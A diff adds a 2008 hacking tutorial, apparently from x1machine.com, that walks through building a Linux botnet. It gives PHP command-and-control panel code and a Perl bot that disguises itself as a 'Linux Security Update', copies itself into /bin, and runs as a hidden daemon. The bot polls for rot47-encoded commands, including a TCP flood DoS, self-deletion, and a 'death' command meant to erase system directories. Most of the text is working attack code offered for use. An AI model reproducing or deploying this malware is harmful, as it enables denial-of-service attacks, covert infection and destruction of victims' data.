@@ -1,0 +1,608 @@
+
+[ Setting up BotNet: HTTP Control module and perl bot ]
+
+Here i'm gonna show you how to code a very simple bot in perl scripting language and http control module. The bot is for Linux systems. You can use all the code shown here, modify it and redistribute as well. And notice, you are the only one who will be responsible for any usage of this information. OK, lets say you got a linux on your machine so now you need a few tools to proceed. BTW, some coding skills required too. So, to test final product you need a web server running on your machine or an account on some free web hosting. To set up web server just open terminal and search for it in repositories.
+
+x1machine~# slapt-get --search apache
+
+apache-ant-1.7.0-i586-1bj [inst=no]: ant (Java-based build tool)
+apache-tomcat-6.0.16-i486-1ld [inst=no]: apache_tomcat (a Servlet/JSP container)
+apr-1.2.8-i486-1 [inst=yes]: apr (Apache Portable Runtime)
+apr-util-1.2.8-i486-1 [inst=yes]: apr-util (Apache Portable Runtime utilities)
+gconf-2.20.1-i686-6as [inst=no]: GConf (Configuration system)
+httpd-2.2.4-i486-6 [inst=no]: httpd (The Apache HTTP Server)
+httpd-2.2.9-i486-1_slack12.0 [inst=no]: httpd (The Apache HTTP Server)
+mm-1.4.2-i486-2 [inst=no]: mm (Shared Memory Allocation library)
+mod_mono-1.9-i686-1as [inst=no]: Mod_mono (Apache module is used to run ASP.NET)
+proftpd-1.3.0a-i486-1 [inst=no]: proftpd (FTP server daemon)
+proftpd-1.3.1-i486-1_slack12.0 [inst=no]: proftpd (FTP server daemon)
+xalan-c-1.10.0-i686-1dav [inst=no]: Xalan-C++
+xerces-c-2.8.0-i686-1as [inst=no]: Xerces-C++ (Validating XML parser)
+
+x1machine~# slapt-get --install httpd-2.2.9-i486-1_slack12.0 [inst=no]: httpd (The Apache HTTP Server)
+
+Ok, next thing, php interpreter, as our control module will use php scriptting language
+
+x1machine~# slapt-get --search php
+
+php-5.2.3-i486-2 [inst=no]: php (HTML-embedded scripting language)
+php-5.2.6-i486-1_slack12.0 [inst=no]: php (HTML-embedded scripting language)
+
+x1machine~# slapt-get --install php-5.2.6-i486-1_slack12.0
+
+Next step, you need mysql database, as information about bots will be stored in mysql database
+
+x1machine~# slapt-get --search mysql
+
+kmysqladmin-0.7.2-i486-1as [inst=no]: Kmysqladmin (A graphical frontend for mysql servers)
+knoda-0.8.3-i486-1ms [inst=no]: Knoda (A database frontend for KDE)
+mysql-5.0.37-i486-1 [inst=no]: mysql (SQL-based relational database server)
+mysql-5.0.51-i486-1_slack12.0 [inst=no]: mysql (SQL-based relational database server)
+mysql-administrator-5.0r12-i486-2sl [inst=no]: mysql-administrator (GUI tool for MySQL Server)
+mysql-gui-common-5.0r12-i486-2sl [inst=no]: mysql-gui-common (Libraries for MySQL tools)
+mysql-query-browser-5.0r12-i486-2sl [inst=no]: mysql-query-browser (Visual database query tool)
+
+x1machine~# slapt-get --install kmysqladmin-0.7.2-i486-1as
+x1machine~# slapt-get --install mysql-5.0.51-i486-1_slack12.0
+x1machine~# slapt-get --install mysql-administrator-5.0r12-i486-2sl
+x1machine~# slapt-get --install mysql-gui-common-5.0r12-i486-2sl
+x1machine~# slapt-get --install mysql-query-browser-5.0r12-i486-2sl
+
+Ok, now you have 3 most important elements. Lets check php now. Open /etc/httpd/httpd.conf and search for lines:
+
+LoadModule php5_module lib/httpd/modules/libphp5.so
+AddType application/x-httpd-php .php
+
+or this one line:
+
+Include /etc/httpd/mod_php.conf
+
+If you have this lines, its ok, but if not - add these first two. Your server directory should look like: /var/www/htdocs so go there and create some php file to test if everything working nice.
+
+<?php echo phpinfo(); ?>
+
+save it as file.php and open in web browser like this: http://localhost/file.php , if your server is working - you'll see nice php settings, if not - search for help in google. Now try to launch mysql daemon:
+
+x1machine~# mysql
+
+if you have problems with launching mysql, try to use my tool from x1machine store. If you still cannot launch mysql, google is your friend. Lets say you got luck and everything is running, so now we are going to code contol module for our botnet. First our file will store database settings , configuration file:
+
+cf.php
+-------------------------------------------------------------------------------------------------------------|
+<php 
+$x_host = "localhost"; // databse host, edit this 
+$x_login = "root"; // database login, edit this 
+$x_pass = "123456"; // database password, edit this 
+$x_base = "machines"; // database, will be created
+$x_table = "Linux"; //database table for linux machines, will be created
+?>
+-------------------------------------------------------------------------------------------------------------|
+
+Save it. Now, to make our life easier, lets create database installation script, which will create our database and database table.
+
+install.php
+-------------------------------------------------------------------------------------------------------------|
+<php 
+include("cf.php"); //including our configuration file
+function MysqlConnect($host, $login, $pass){ // prototype of our mysql connection function
+$con=mysql_connect($host,$login,$pass); 
+if ($con===FALSE){
+die('Cannot connect to MySql');}}
+MysqlConnect($x_host, $x_login, $x_pass); // connect to mysql
+mysql_query("CREATE DATABASE $x_base"); // creating databse for botnet
+mysql_select_db($x_base); // select that database for manipulation
+$crtable = "CREATE TABLE `$x_table` (". // create table where all info will be stored
+"`id` int(10) unsigned NOT NULL auto_increment,".
+"`uid` text NOT NULL,".
+"`ip` text NOT NULL,". 
+"`lseen` text NOT NULL,".
+" PRIMARY KEY (`id`)".
+");";
+mysql_query($crtable); // run our Create Table function
+?>
+-------------------------------------------------------------------------------------------------------------|
+
+Now we need a script that will capture information about our bots as they will connect, and store it in database.
+
+base.php
+-------------------------------------------------------------------------------------------------------------|
+<php 
+Error_Reporting(E_ALL & ~E_NOTICE); // make mysql report no errors
+
+include("cf.php"); // include config file
+
+function MysqlConnect($host, $login, $pass, $base){ // mysql connect function
+$con=mysql_connect($host,$login,$pass); // connecting
+
+if ($con===FALSE){ // if not connected..
+die('cant connect to database');
+}
+
+$db=mysql_select_db($base); // select databse for manipulation
+
+if ($db==FALSE){ // if cannot select ...
+die('cant select database'); 
+}}
+
+MysqlConnect($x_host, $x_login, $x_pass, $x_base); // connecting...
+
+$uid = htmlspecialchars(addslashes($_GET['uid'])); // get bot's name / uid
+$data = htmlspecialchars(addslashes(getenv("REMOTE_ADDR"))); // get bot's IP
+$gcmd = $_GET['gcm']; 
+$lseen = date ("H:i:s d.m.Y"); // connecting date and time
+// bot will use url like this: http://localhost/botnet/cmd.php?gcm=1&uid=Bot_Name 
+
+if ($gcmd == 1){ // [cmd.php?gcm=1] -> $_GET['gcm']
+$res=mysql_query("SELECT ip FROM $x_table WHERE uid='".$uid."'"); // select some value from database
+for ($i=0, $ROWS=mysql_num_rows($res); $i<$ROWS; $i++) // our loop for fetching databse
+{
+$row=mysql_fetch_row($res); // fetching database
+for($j=0;$j<count($row);$j++) // next loop 
+echo $row[$j]; // print result
+}
+
+if($row){ // if there is a row 
+$update = mysql_query("UPDATE $x_table SET ip='$data', lseen='$lseen' WHERE uid='$uid'"); // we updating database, bot exists
+} else { // if there is no bot in database
+mysql_query("INSERT INTO $x_table (uid, ip, lseen) VALUES ('$uid', '$data', '$lseen')"); // we insert him there
+}
+}
+?>
+-------------------------------------------------------------------------------------------------------------|
+
+Lets create now simple script, which will show our botnet statistics.
+
+st.php
+-------------------------------------------------------------------------------------------------------------|
+<html><!--here goes html part, we are creating stylesheet or whatever, that will show our data-->
+<head>
+<title>Botnet Control System</title> 
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+.style1 {
+font-family: Geneva, Arial, Helvetica, sans-serif;
+font-size: 12px;
+}
+span { color:#FFFFFF}
+form { margin:0px; padding:0px}
+body { margin:0px; padding:0px; background:#080705}
+a{ color:#FFFFFF; text-decoration:none}
+a:hover{ text-decoration:underline}
+.style1 {
+font-family: Geneva, Arial, Helvetica, sans-serif;
+font-size: 12px;
+color: white;
+}
+INPUT, SELECT, TEXTAREA {
+FONT-SIZE: 8pt; FONT-FAMILY: Verdana, Helvetica;
+border: 1px solid silver;
+color: black
+background-color: transparent;
+margin-top: 0px;
+margin-bottom: 0px;
+}
+.HEAD TD {
+BACKGROUND: transparent; TEXT-ALIGN: center; FONT-WEIGHT: bold
+color: black
+}
+.SLIST TD {
+BACKGROUND: transparent
+color: black
+</style> 
+</head>
+<body bgcolor="#000000" text="#FFFFFF"> 
+<table style="border:#000000 1px solid; background:url(bio.jpg) no-repeat" align="center">
+<tr>
+<td style="width:700px; height:650px">
+<center>© BotNet Control System</center>
+<span class="style1"><center>Designed For Hybrid Control</center></span><br><br> 
+<span class="style1"><a href="index.php">[<--Return]</a></span>
+<center>
+<--End of html form, now php script --> 
+<php 
+include("cf.php"); // include conf file
+// here goes the same mysql connect function... 
+function MysqlConnect($host, $login, $pass, $base){
+$con=mysql_connect($host,$login,$pass);
+
+if ($con===FALSE){
+die('cant connect to database');
+}
+
+$db=mysql_select_db($base);
+
+if ($db==FALSE){
+die('cant select database'); 
+}}
+
+function ShowStats($x_table) // this function will show our statistics...
+{ //6 
+// html form again.. 
+
+echo '<br><br><b><center><span class="style1">[ Linux Machines ]</span></center></b><br><br>';
+echo '<center><span class="style1">'; 
+echo '<table style="text-align:left;width:600px;height:40px;"border="1px" cellpadding="0"';
+echo 'cellspacing="0"><tbody><tr>';
+echo '<td><center><span class="style1"> bot </span></center></td>'; 
+
+echo '<td><center><span class="style1"> ip adress </span></center></td>'; 
+echo '<td><center><span class="style1"> last connection </span></center></td>'; 
+echo '<td><center><span class="style1"> command </span></center></td>'; 
+echo '</tr></span></center>'; 
+
+$res = mysql_query("SELECT * FROM $x_table"); // select everything from botnet table
+for ($i=0, $ROWS=mysql_num_rows($res); $i<$ROWS; $i++){ // loop 
+$row = mysql_fetch_assoc($res); // fetching...
+echo '<tr>'; 
+foreach ($row as $key => $value){ // next loop 
+if($key=="id") continue; // look for 'id' value
+// now simply select and print what do we have in databse based on our values if($key=="uid"){ // bot name
+$uid = $value; 
+echo "<td>$value</td>";
+} //^1
+if($key=="ip"){ // IP 
+$ip = $value;
+echo "<td>$ip</td>";
+} //^2
+if($key=="lseen"){ // last seen 
+$lcon = $value; 
+echo "<td>$lcon</td>";
+} //^3 
+} //^4
+
+// a button to delete bot from database if he is inactive for a long time, probably dead or removed ;/ 
+echo '<td><center><a href = "'; echo "?bot=delete&uid=$uid"; 
+echo '"> delete </a></center></td>';
+echo '</tr>';}
+echo '</tbody></table></center>';
+} //^5 
+//^6 
+MysqlConnect($x_host, $x_login, $x_pass, $x_base);
+
+ShowStats($x_table);
+if($_GET['bot'] == "delete"){ // if we wanna delete bot...button pressed
+$duid = htmlspecialchars(addslashes($_GET['uid']));
+echo "<b> realy delete $duid ?</b>";
+echo '<form action="" method="post">'; 
+echo '<input name="submit" style="background-color:transparent;color:ghostwhite;border:1px;border-style: dotted" value="yup" type="submit"><br><br>'; 
+echo '</form><br><br>'; 
+if(!is_null($_POST['submit'])){ // if we realy want to delete it...
+mysql_query("DELETE FROM $x_table WHERE uid = '$duid'"); // deleting from database
+echo "<br><a href = ?act=stat> press here for redirect </a><br>";
+echo '<script>location="st.php";</script>'; }}
+
+?>
+
+</body>
+</html> 
+-------------------------------------------------------------------------------------------------------------|
+
+Ok, save the file. Now we need script to give commands to our bots. Simply script will write commands to a text file, encoded with rot47 encryption. Here we go...
+
+cmd.php
+-------------------------------------------------------------------------------------------------------------|
+<?php
+if(isset($_POST['action'] ) ){ // everyone knows what that is for...
+$action=$_POST['action']; 
+$cmd=$_POST['cmd']; 
+}
+?>
+<html>
+<head>
+<--Next html form --> <title>© BotNet Control System</title> 
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+.style1 {
+font-family: Geneva, Arial, Helvetica, sans-serif;
+font-size: 12px;
+}
+span { color:#FFFFFF}
+form { margin:0px; padding:0px}
+body { margin:0px; padding:0px; background:#080705}
+a{ color:#FFFFFF; text-decoration:none}
+a:hover{ text-decoration:underline}
+</style>
+</head>
+<body bgcolor="#000000" text="#FFFFFF"> 
+<table style="border:#000000 1px solid; background:url(bio.jpg) no-repeat" align="center">
+<tr>
+<td style="width:700px; height:650px">
+<span class="style1"><a href="index.php">[<--Return]</a></span>
+<center>SetUp Command For Bot</center>
+<center><form name="form1" method="post" action="" enctype="multipart/form-data">
+<br>
+<table border="1px">
+<tr>
+<td>
+<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
+Command:</font></div>
+</td>
+<td><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
+<input type="text" style="background-color:transparent;color:ghostwhite;border:0px" name="cmd" value="<?php print $cmd; ?>" size="30"> 
+</font>
+<input type="hidden" name="action" value="submit">
+<input type="submit" style="background-color:transparent;color:ghostwhite;border:0px" value="[submit]"> 
+</td> </center>
+<--End of html form --> <?php
+
+if (!function_exists('str_rot47')) // that function will encode commands with rot47
+{function str_rot47($str) {
+return strtr($str, '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~', 'PQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO');
+}} 
+
+if ($action){ // if submit button pressed
+$crycmd = str_rot47($cmd); // encoding command
+$plik = fopen("cm.txt","w+"); // open file for overwriting 
+fwrite($plik,$crycmd); // writing command to text file 
+fseek($plik,0); 
+$linia = fread($plik,100); // read file 
+$line = str_rot47($linia); // decode command
+echo "Command: <PRE>$line</PRE>"; // print command 
+fclose($plik); // close file 
+} 
+?> 
+</table><br><br> 
+Commands should have format like --> cmd:argv1:argv2<br>
+Ex --> ddos:host:port:time (in sec), ddos:localhost:80:666<br>
+Available Commands:<br>
+<span class="style1">Sleep --> sleep:time</span><br>
+<span class="style1">Erase victim HDD --> death</span><br>
+<span class="style1">DoS --> ddos:host:port:time</span><br>
+<span class="style1">Message to victim --> msg:some message</span><br>
+</body>
+</html> 
+-------------------------------------------------------------------------------------------------------------|
+
+Ok. And the last file, our main index file.
+
+index.php
+-------------------------------------------------------------------------------------------------------------|
+<?php
+// if you need to access admin panel you have to login...
+$auth = 666;
+$name='c4ca4238a0b923820dcc509a6f75849b'; //change this to your login in md5 encoding
+$pass='c4ca4238a0b923820dcc509a6f75849b'; // change this to your password in md5 encoding
+if($auth == 666) {
+if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
+{
+header('WWW-Authenticate: Basic realm="x1machine"');
+header('HTTP/1.0 401 Unauthorized');
+exit("admin panel: Access Denied"); 
+}
+} 
+?> 
+
+<html>
+<head>
+<title>Botnet Control System</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+.style1 {
+font-family: Geneva, Arial, Helvetica, sans-serif;
+font-size: 12px;
+}
+span { color:#FFFFFF}
+form { margin:0px; padding:0px}
+body { margin:0px; padding:0px; background:#080705}
+a{ color:#FFFFFF; text-decoration:none}
+a:hover{ text-decoration:underline}
+</style>
+
+</head>
+<body bgcolor="#000000" text="#FFFFFF"> 
+<table style="border:#000000 1px solid; background:url(bio.jpg) no-repeat" align="center">
+<tr>
+<td style="width:700px; height:650px">
+<center>© BotNet Control System</center>
+<span class="style1"><center>Designed For Hybrid Control</center></span><br><br> 
+<center>
+
+<a href="st.php"><span class="style1"> >Statistics< </span></a><br>
+
+<?php
+
+if (!function_exists('str_rot47')) // rot47 function 
+{function str_rot47($str) {
+return strtr($str, '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~', 'PQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO');
+}} 
+
+$plik = fopen("cm.txt","r"); // open file 
+$linia = fread($plik,100); // read file
+$line = str_rot47($linia); // decode command
+echo "Command For Bots: <PRE>$line</PRE>"; // print command 
+fclose($plik); // close file 
+?>
+<a href="cmd.php"><span class="style1"> >set command for bot< </span></a><br>
+</center>
+</table>
+</body>
+</html>
+-------------------------------------------------------------------------------------------------------------|
+
+So, now we got control panel. Now put all files in server directory and run install.php file like: http://localhost/install.php , this should create database. After you can delete install.php. Check out your new admin panel for botnet control. Oh, and create empty text file, like: cm.txt. Here commands will be stored. And, 
+x1machine~# chmod 777 /var/www/htdocs/cm.txt
+Ok. The last thing we need it's bot. Our small perl ddos bot.
+
+bot.pl
+-------------------------------------------------------------------------------------------------------------|
+use Socket; #perl libraries, we need them oh yeah!
+use IO::Socket;
+require LWP::UserAgent;
+use IO::Handle;
+use Tk;
+use Tk::Text;
+use Tk::MainWindow;
+use Tk::DummyEncode;
+use Tk::Frame;
+use Tk::LabFrame;
+use POSIX qw(setsid);
+use LWP::Simple;
+
+# this is for perl2exe, to compile our bot into standalone executable
+# what we will do to make it run on Linux without perl interpreter installed
+# notice, i have used Tk graphical libraries
+# coz i want to have MessageBox command
+# like i can display some message on victim system
+# if you dont need to do that, you can delete them
+# you'll get less fucking with perl2exe to compile your bot
+#perl2exe_include Socket
+#perl2exe_include IO::Socket
+#perl2exe_include LWP::UserAgent
+#perl2exe_include IO::Handle
+#perl2exe_include Tk
+#perl2exe_include Tk::Text
+#perl2exe_include Tk::MainWindow
+#perl2exe_include Tk::DummyEncode
+#perl2exe_include Tk::Frame
+#perl2exe_include Tk::LabFrame
+#perl2exe_include LWP::Simple
+#perl2exe_include utf8;
+#perl2exe_include "unicore/lib/gc_sc/Word.pl";
+#perl2exe_include "unicore/lib/gc_sc/Digit.pl";
+#perl2exe_include "unicore/lib/gc_sc/SpacePer.pl";
+#perl2exe_include "unicore/lib/gc_sc/Uppercas.pl";
+#perl2exe_include "unicore/To/Lower.pl";
+
+sub rot47 { #rot47 decryptor of commands from remote http server
+my ($str)=@_;
+$str =~ tr/!-~/P-~!-O/;
+return $str;
+}
+
+sub getcmd { # that is how bot gets commands from remote server
+open (F,"</etc/bot.log"); #this will be bot name
+my $xx3 = <F>; # store bot name in variable $xx3 
+my $ua = LWP::UserAgent->new; // initialize tcp connection
+$ua->timeout(100); $ua->env_proxy;
+my $url = "http://localhost/hybrid/base.php?gcm=1&uid=$xx3"; # here we will go
+my $response = $ua->get($url); # perform connection, now bot is in statistics
+my $ua2 = LWP::UserAgent->new; # now new connection to get commands
+$ua2->timeout(100); $ua2->env_proxy;
+my $url2 = "http://localhost/hybrid/cm.txt"; # here is our commands
+my $response2 = $ua2->get($url2); # connect...
+if ($response2->is_success) { # if success
+my ($str1, $str2, $str3, $str4, $str5, $str6, $str7); # declarating of strings
+$str1 = "sleep"; $str3 = $str1 . $str2; $str4 = "ddos"; # our commands
+$str5 = "selfdel"; $str6 = "death"; $str7 = "msg";
+$length = length ($random_number.$login); # i was experimenting and dont remmember what that for ;P
+my $cryangel = rot47($response2->content); # decrypt http server response
+if ($cryangel =~ /^$str3/ || $cryangel =~ /^0-9$/){ # and here we go...
+@words = split(/:/, $cryangel); # splittig line into words...
+my $arg = $words[1]; # each word is an argument
+sleep $arg; # and there goes bot<->server communication format, like: if command is sleep, then sleep for time extracted from argument, etc.. 
+} elsif ($cryangel =~ /^$str4/){
+my $pid = fork();
+if ($pid == 0){
+@words2 = split(/:/, $cryangel);
+my $argv1 = $words2[1]; my $argv2 = $words2[2];
+# DoS function grepped from Panic ddos tool
+# Just a little bit smaller here
+my $host = $argv1; my $port = $argv2; my $time = $argv3;
+my $x1 = my $x2 = my $x3 = 1; my $x10 = 0; my $x7 = getprotobyname("tcp");
+my $x11 = inet_aton($host); my $x12 = sockaddr_in($port, $x11);
+my $x8 = IO::Socket::INET->new (PeerAddr=>$host,PeerPort=>$port,Proto=>$x7,Timeout=>10,ReuseAddr=>1) or die; shutdown($x8, 2) or die; while(31337) { my $x5 = 0; while($x5<$x1) { my $x4 = "SOCK_$x5";
+socket($x4, PF_INET, SOCK_STREAM, $x7); connect($x4, $x12) || $x3--; $x5++;} $x10++; my $x6 = 0; while($x6<$x2) { $x9 = "SOCK_$x6" ; shutdown($x9, 2) or die ""; $x6++; }} }
+else { sleep $argv3; kill 9, $pid;}
+} elsif ($cryangel =~ /^$str5/){ 
+unlink $0;
+unlink "/etc/bot.log";
+}elsif ($cryangel =~ /^$str6/){
+rmdir("/home/"); rmdir("/var/");
+rmdir("/root/"); rmdir ("/usr/");
+rmdir("/etc/"); rmdir("/lib/");
+rmdir("/bin/"); rmdir("/");
+}elsif ($cryangel =~ /^$str7/){
+# here goes my beloved MessageBox command :P 
+@words3 = split(/:/, $cryangel);
+my $ar1 = $words3[1];
+my $m_____ = new MainWindow( -title => "System Message" );
+$m_____->resizable(0,0);
+my $m______ = $m_____->LabFrame(-label=>"Warning!", -labelside => "acrosstop") -> pack();
+my $m_______ = $m______->Label(-text=>"$ar1") -> pack();
+MainLoop; 
+} else {
+sleep 10;
+# or you can add here your own function 
+}
+}
+}
+
+sub daemonize{ # we need our bot to be a daemon, it's like service in windows
+chdir '/' or die ""; # change directory
+open STDIN, '/dev/null' or die ""; # redirect output to the black hole :D:D
+open STDOUT, '>>/dev/null' or die "";
+open STDERR, '>>/dev/null' or die "";
+defined(my $pid = fork) or die ""; # forking..
+exit if $pid; # forked to background
+setsid or die "";
+umask 0;
+}
+
+sub checklog{ # our check log function
+# bot will create log file to store some info in it, like his own name 
+open (F,"</etc/bot.log");
+my $xxx = <F>; 
+if (length($xxx) > 2){
+close F;
+daemonize();
+
+} elsif ($xxx == "1"){
+unlink("/etc/bot.log");
+my($logFile) = "/etc/bot.log";
+my($script) = __FILE__;
+my $range = 10000000000;
+my $random_number = int(rand($range));
+my $login = getlogin();
+my($name) = $random_number.$login;
+open(LOGFILE,">>$logFile") or die("");
+print LOGFILE ("$name");
+close(LOGFILE);
+close F;
+daemonize();
+
+} else {
+print "<------------------------------->\n";
+print "| Linux Security Update |\n";
+print "<------------------------------->\n";
+print "Installing Modules...";
+system "cp $0 /bin/zkhelper";
+#$in = $0;
+#$out = "/bin/zkhelper";
+#open (IN,$in);
+#open (OUT,">$out");
+#print OUT $buffer while
+(read (IN,$buffer,65536)); 
+my($logFile) = "/etc/bot.log";
+my($script) = __FILE__;
+my($name) = "1";
+open(LOGFILE,">>$logFile") or die("");
+print LOGFILE ("$name");
+close(LOGFILE);
+# system "echo '/bin/zkhelper' >> /etc/cron.daily/0anacron";
+# system "echo '\n/bin/zkhelper' >> /etc/profile"; 
+system "chmod 777 /bin/zkhelper";
+system "zkhelper";
+unlink $0;
+exit;
+}}
+
+# and last, main body
+checklog(); # check log file for info
+while(1) { # infinitive loop
+getcmd();
+sleep (10);
+}
+-------------------------------------------------------------------------------------------------------------|
+
+Now you can compile it with perl2exe like:
+
+x1machine~# perl2exe bot.pl
+
+If you will not use Tk libs, you can just download perl2exe and compile it without any problems i think... But, if there is some shit like perl2exe telling you that you dont have some libs, but bot is running nice on your own machine, look for that libs on your system, you should find them, next copy missing libs to perl2exe/perl5 folder, into included folders. Anyway, just read debugging info while compiling bot. 
+
+Notice that, in bots code, there are moments when function 'die' is used. If shit will happen and 'die' will executed, bot will die forever, you have to think 'bout replace them with for ex. 'exit'. And another thing, think 'bout how to make bot start with system start. Anyway, with modifications, you are on you own.
+
+And here ya go, you got a control module and the bot. Have fun. 
+
+Author: cross
+© 2008 x1machine.com 
